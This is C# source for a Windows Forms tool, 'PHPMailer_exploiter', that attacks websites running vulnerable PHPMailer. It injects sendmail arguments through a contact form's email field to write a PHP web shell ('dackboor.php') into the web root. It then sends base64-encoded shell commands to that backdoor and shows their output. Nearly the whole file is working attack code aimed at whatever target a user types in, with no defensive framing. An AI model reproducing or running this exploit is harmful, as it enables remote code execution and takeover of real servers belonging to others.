using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Windows.Forms;

namespace PHPMailer_exploiter
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {
             target = textBox1.Text.Trim();
            buttonAttack.Enabled = target.Contains(".") && target.Length > 4;

        }

        private void UploadShellTo(bool forceSSL=false)
        {
            try
            {
                target = textBox1.Text.Trim();

                button_execute.Enabled = false;

                if (target.StartsWith("http") == false)
                {
                    target = "http" + (forceSSL?"s":"")+"://" + target;
                }
                var req = WebRequest.Create(target);


                var webClient = new WebClient();
                string boundary = "------------------------" + DateTime.Now.Ticks.ToString("x");
                webClient.Headers.Add("Content-Type", "multipart/form-data; boundary=------WebKitFormBoundaryzXJpHSq4mNy35tHe");
               
                var package = "------WebKitFormBoundaryzXJpHSq4mNy35tHe\r\n";
                package += "Content-Disposition: form-data; name=\"action\"\r\n";

                package += "\r\nsubmit";
                package += "\r\n------WebKitFormBoundaryzXJpHSq4mNy35tHe\r\n";
                package += "Content-Disposition: form-data; name=\"name\"\r\n";

                package += "\r\n<?php echo \"|\".base64_encode(system(base64_decode($_GET[\"cmd\"]))).\"|\"; ?>";
                package += "\r\n------WebKitFormBoundaryzXJpHSq4mNy35tHe\r\n";
                package += "Content-Disposition: form-data; name=\"email\"\r\n";

                package += "\r\nvulnerables@ -OQueueDirectory=/tmp -X/www/" + ShellFileName;
                package += "\r\n------WebKitFormBoundaryzXJpHSq4mNy35tHe\r\n";
                package += "Content-Disposition: form-data; name=\"message\"\r\n";

                package+="\r\nPwned";
                package += "\r\n------WebKitFormBoundaryzXJpHSq4mNy35tHe--";

                var nfile = webClient.Encoding.GetBytes(package);

                byte[] resp = webClient.UploadData(target, "POST", nfile);
                
                button_execute.Enabled = true;
                _attack_statue.Text = ".";

            }
            catch { _attack_statue.Text = "Error"; }
        }

        private void button_execute_Click(object sender, EventArgs e)
        {
            target = textBox1.Text.Trim();
            string plainCommands = richTextBox1.Text;
            string b64_encoded_commands = Base64Encode(plainCommands);
            string url = "http" + (ForceSSL ? "s" : "") + "://" + this.target +"/"+ ShellFileName + "?cmd="+b64_encoded_commands;

            try
            {
                var req =(HttpWebRequest) WebRequest.Create(url);
                var resp = req.GetResponse();
                string resp_text = new StreamReader(resp.GetResponseStream()).ReadToEnd();
                this.LastResponseBody=RTXBX_Result.Text = resp_text;
            }
            catch { }

        }
        public string ShellFileName = "dackboor.php";

        public string target="";

        public bool ForceSSL=false;

        public string LastResponseBody="";
        public static string Base64Encode(string plainText)
        {
            var plainTextBytes = System.Text.Encoding.UTF8.GetBytes(plainText);
            return System.Convert.ToBase64String(plainTextBytes);
        }
        public static string Base64Decode(string base64EncodedData)
        {
            var base64EncodedBytes = System.Convert.FromBase64String(base64EncodedData);
            return System.Text.Encoding.UTF8.GetString(base64EncodedBytes);
        }

        private void buttonAttack_Click(object sender, EventArgs e)
        {
            UploadShellTo();

        }

        private void checkBox1_CheckedChanged(object sender, EventArgs e)
        {
            this.ForceSSL = checkBox1.Checked;
        }

        private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            try
            {

                RTXBX_Result.Text = Base64Decode(RTXBX_Result.Text);
            }
            catch { }
        }

        private void label4_Click(object sender, EventArgs e)
        {
            MessageBox.Show("This tool was Created by Yasser Gersy \r\nFeel free to contact me for any suggest/request gersy.ch2@gmail.com");
            System.Diagnostics.Process.Start("https://twitter.com/yassergersy");

        }

        private void linkLabel2_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            System.Diagnostics.Process.Start("https://www.exploit-db.com/exploits/40968/");
        }
    }
}
